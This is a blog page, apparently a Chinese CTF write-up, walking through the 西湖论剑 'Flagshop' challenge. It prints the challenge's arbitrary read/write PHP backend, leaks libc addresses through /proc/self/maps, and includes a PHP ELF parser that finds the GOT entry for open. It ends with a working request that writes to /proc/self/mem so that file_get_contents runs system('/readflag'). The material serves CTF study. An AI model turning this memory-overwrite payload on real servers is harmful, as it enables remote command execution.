@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>西湖论剑 Flagshop 分析复现 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search" name='keys'>
+		</div>
+	</div>
+</form>
+
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.mrskye.cn/" target="_blank">SkYe&#39;s Blog</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.kawhi.xyz" target="_blank">kawhi</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      西湖论剑 Flagshop 分析复现
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>比赛时候没能做出来，其实这道题就是一道pwn题。</li>
+</ul>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ul>
+<li>抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-112129@2x.png" alt="WX20201013-112129@2x"></p>
+<ul>
+<li>读取题目全部源码：</li>
+</ul>
+<blockquote>
+<p>backend.php</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+
+$offset = isset($_GET[&#39;offset&#39;]) ? $_GET[&#39;offset&#39;] : 0;
+$buffer = isset($_GET[&#39;buffer&#39;]) ? $_GET[&#39;buffer&#39;] : &quot;&quot;;
+
+if (isset($_GET[&#39;writefile&#39;])) {
+    $fp = fopen($_GET[&#39;writefile&#39;], &quot;a&quot;);
+    fseek($fp, $offset);
+    fwrite($fp, $buffer);
+    fclose($fp);
+}
+
+if (isset($_GET[&#39;readfile&#39;])) {
+    echo file_get_contents($_GET[&#39;readfile&#39;]);
+}
+?&gt;</code></pre>
+<blockquote>
+<p>Index.php</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+
+if(!isset($_COOKIE[&#39;sandbox&#39;])) {
+  $uuid = system(&quot;/var/www/html/copy&quot;);
+  setcookie(&quot;sandbox&quot;, $uuid);
+  header(&quot;Location: sandbox/&quot;.$uuid);
+} else {
+  header(&quot;Location: sandbox/&quot;.$_COOKIE[&#39;sandbox&#39;]);
+}</code></pre>
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><ul>
+<li>从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。</li>
+<li>做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(<a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a>)</li>
+</ul>
+<h3 id="内存泄露和动态链接库"><a href="#内存泄露和动态链接库" class="headerlink" title="内存泄露和动态链接库"></a>内存泄露和动态链接库</h3><blockquote>
+<p> /proc/self/maps</p>
+<p> 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
+</blockquote>
+<pre><code class="shell">address           perms offset  dev   inode   pathname
+08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
+08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
+08058000-0805b000 rwxp 00000000 00:00 0
+40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
+40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
+4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
+40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
+4013e000-40142000 rw-p 00000000 00:00 0
+bffff000-c0000000 rwxp 00000000 00:00 0</code></pre>
+<ul>
+<li>通过SSRF漏洞直接读取<code>/proc/self/maps</code>来泄露当前程序调用的到昂来链接库和内存地址。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-114932@2x.png" alt="WX20201013-114932@2x"></p>
+<ul>
+<li>直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：<code>0x0000000000046590</code></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-115346@2x.png" alt="WX20201013-115346@2x"></p>
+<ul>
+<li>我们将动态链接库的地址加上<code>system</code>的偏移就能计算出<code>system</code>函数的地址。</li>
+</ul>
+<pre><code class="php">&lt;?php
+echo dechex(0x7ffff5f40000+0x0000000000046590);
+//system函数结果：0x7ffff5f86590
+?&gt;</code></pre>
+<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><ul>
+<li><p>我们知道system函数的地址，我们就可以将open函数的地址替换为<code>system</code>函数的地址，我们在<code>file_get_contents</code>传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。</p>
+</li>
+<li><p>这里需要用到<code>/proc/self/exe</code></p>
+</li>
+</ul>
+<blockquote>
+<p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
+<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.</p>
+</blockquote>
+<ul>
+<li>同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。</li>
+</ul>
+<pre><code class="php">&lt;?php
+function packlli($value) {
+    $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
+    $lower = $value &amp; 0x00000000ffffffff;
+    return pack(&#39;V2&#39;, $lower, $higher);
+}
+
+function unp($value) {
+    return hexdec(bin2hex(strrev($value)));
+}
+function parseelf($bin_ver, $rela = false) {
+    $bin = file_get_contents($bin_ver);
+    $e_shoff = unp(substr($bin, 0x28, 8));
+    $e_shentsize = unp(substr($bin, 0x3a, 2));
+    $e_shnum = unp(substr($bin, 0x3c, 2));
+    $e_shstrndx = unp(substr($bin, 0x3e, 2));
+
+    for($i = 0; $i &lt; $e_shnum; $i += 1) {
+        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
+        if($sh_type == 11) { // SHT_DYNSYM 
+            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
+        }
+        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB
+            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+        }
+        elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA
+            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
+        }
+    }
+
+    if($rela) {
+        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
+            $r_offset = unp(substr($bin, $i, 8));
+            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
+            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
+            $name = &#39;&#39;;
+            $j = $strtab_off + $name_off - 1;
+            while($bin[++$j] != &quot;\0&quot;) {
+                $name .= $bin[$j];
+
+            }
+
+            if($name == &#39;open&#39;) {
+                return $r_offset;
+            }
+        }
+    }
+    else {
+        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
+            $name_off = unp(substr($bin, $i, 4));
+            $name = &#39;&#39;;
+            $j = $strtab_off + $name_off - 1;
+            while($bin[++$j] != &quot;\0&quot;) {
+                $name .= $bin[$j];
+            }
+            if($name == &#39;__libc_system&#39;) {
+                $system_offset = unp(substr($bin, $i + 8, 8));
+            }
+            if($name == &#39;__open&#39;) {
+                $open_offset = unp(substr($bin, $i + 8, 8));
+            }
+        }
+        return array($system_offset, $open_offset);
+    }
+}
+$open_php = parseelf(&#39;exe&#39;, true);
+//$maps = file_get_contents(&#39;lib.txt&#39;);
+//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
+echo $open_php;
+//结果：15333784
+?&gt;</code></pre>
+<h3 id="修改进程内存"><a href="#修改进程内存" class="headerlink" title="修改进程内存"></a>修改进程内存</h3><blockquote>
+<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
+</blockquote>
+<ul>
+<li><p>也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。</p>
+<pre><code>backend.php?readfile=/readflag&gt;/tmp/i_o_u_hlq&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784</code></pre></li>
+<li><p>直接读取<code>/tmp/i_o_u_hlq</code>就可以直接<code>getflag</code></p>
+</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG2879.png" alt="WechatIMG2879"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><p>Nu1L 西湖论剑wp</p>
+</li>
+<li><p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
+</li>
+<li><p><a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a></p>
+</li>
+</ul>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-10-13T05:12:04.000Z" itemprop="datePublished">2020-10-13</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div id='maktoc'>
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件读取"><span class="toc-number">2.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件写入"><span class="toc-number">3.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内存泄露和动态链接库"><span class="toc-number">4.</span> <span class="toc-text">内存泄露和动态链接库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算偏移"><span class="toc-number">5.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改进程内存"><span class="toc-number">6.</span> <span class="toc-text">修改进程内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		//console.log(getScrollTop());	
+		
+	}
+window.onresize = function(){
+	var mak_toc = document.getElementById("maktoc");
+	if($(window).width()<1414){
+	mak_toc.setAttribute("style","display:none");
+	}else{
+	mak_toc.setAttribute("style","display:block");
+	}
+}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
